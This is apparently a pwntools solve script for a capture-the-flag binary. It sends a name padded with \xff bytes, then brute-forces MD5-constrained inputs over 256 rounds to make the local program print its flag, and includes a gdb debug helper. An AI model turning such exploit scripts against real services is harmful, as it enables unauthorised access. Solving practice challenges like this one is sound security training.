#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *
import hashlib
from itertools import permutations
from string import ascii_letters,digits

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./chall')
#context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./chall")

def serach_str(idx):
    all_letters=ascii_letters+digits+'.,;'
    for item in permutations(all_letters, 1):
        item = ''.join(item)
        
        hl = hashlib.md5()
        input_str = "attempt%02x_%s" % (idx, item)
        hl.update(input_str.encode(encoding='utf-8'))
        hash_value = hl.hexdigest()
        if "00" in hash_value:
            continue
        
        return item



sa("Hello! What is your nam", "\xff"*12 + "aa")

#debug(0x17F0)
for i in range(0, 256):
    input_str = serach_str(i)
    print(input_str)
    sa("> ", input_str)


ru("Please take this shiny flag: ")
flag = rc()
log.success(flag)
p.interactive()


    


